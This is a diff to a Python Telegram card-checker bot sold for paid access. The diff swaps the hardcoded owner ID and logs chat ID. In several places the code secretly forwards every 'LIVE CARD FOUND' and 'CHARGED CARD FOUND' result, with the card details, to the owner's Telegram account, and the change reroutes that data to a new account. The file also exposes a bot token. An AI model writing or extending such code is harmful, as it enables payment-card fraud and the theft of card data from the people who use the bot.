@@ -17,7 +17,7 @@ import re
 token = "7959620740:AAFAHbQYPrW2KXmzwog4lMiv0XQUVgJ0aEM" 
 bot=telebot.TeleBot(token,parse_mode="HTML")
 
-owners = ["7736734364"]
+owners = ["7826066230"]
         
 # Function to check if the user's ID is in the id.txt file
 def is_user_allowed(user_id):
@@ -68,7 +68,7 @@ def generate_redeem_code():
 
 @bot.message_handler(commands=["code"])
 def generate_code(message):
-    if str(message.chat.id) == '7736734364':
+    if str(message.chat.id) == '7826066230':
         new_code = generate_redeem_code()
         valid_redeem_codes.append(new_code)
         bot.reply_to(
@@ -82,7 +82,7 @@ def generate_code(message):
     else:
         bot.reply_to(message, "You do not have permission to generate redeem codes.🚫")
 
-LOGS_GROUP_CHAT_ID = -1002867786597
+LOGS_GROUP_CHAT_ID = -4970290554
 
 @bot.message_handler(commands=["redeem"])
 def redeem_code(message):
@@ -129,7 +129,7 @@ def start(message):
 You Are Not Authorized to Use this Bot
 
 Your User ID: {user_id}
-Required Owner ID: 7736734364
+Required Owner ID: 7826066230
 
 ⤿ 𝙋𝙧𝙞𝙘𝙚 𝙇𝙞𝙨𝙩 ⚡
 ⤿ 1 day - 90rs/3$ 
@@ -139,7 +139,7 @@ Required Owner ID: 7736734364
 
 Dm @ghostxdy Tᴏ Bᴜʏ Pʀᴇᴍɪᴜm""")
 
-LOGS_GROUP_CHAT_ID = -1002867786597 # Replace with your logs group chat ID
+LOGS_GROUP_CHAT_ID = -4970290554 # Replace with your logs group chat ID
 
 @bot.message_handler(commands=["add"])
 def add(message):
@@ -328,7 +328,7 @@ def main(message):
 					
 					# Send to owner
 					try:
-						bot.send_message(7736734364, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
+						bot.send_message(7826066230, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
 					except:
 						pass
 						
@@ -339,7 +339,7 @@ def main(message):
 					
 					# Send to owner
 					try:
-						bot.send_message(7736734364, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
+						bot.send_message(7826066230, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
 					except:
 						pass
 						
@@ -350,7 +350,7 @@ def main(message):
 					
 					# Send to owner
 					try:
-						bot.send_message(7736734364, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
+						bot.send_message(7826066230, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
 					except:
 						pass
 						
@@ -375,7 +375,7 @@ def main(message):
 					
 					# Send to owner
 					try:
-						bot.send_message(7736734364, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg1}", parse_mode="HTML")
+						bot.send_message(7826066230, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg1}", parse_mode="HTML")
 					except:
 						pass
 				else:
@@ -543,7 +543,7 @@ def chk(message):
             
             # Send to owner
             try:
-                bot.send_message(7736734364, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{message_ra}", parse_mode="HTML")
+                bot.send_message(7826066230, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{message_ra}", parse_mode="HTML")
             except:
                 pass
                 
@@ -565,7 +565,7 @@ def chk(message):
             
             # Send to owner
             try:
-                bot.send_message(7736734364, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg_sec}", parse_mode="HTML")
+                bot.send_message(7826066230, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg_sec}", parse_mode="HTML")
             except:
                 pass
                 
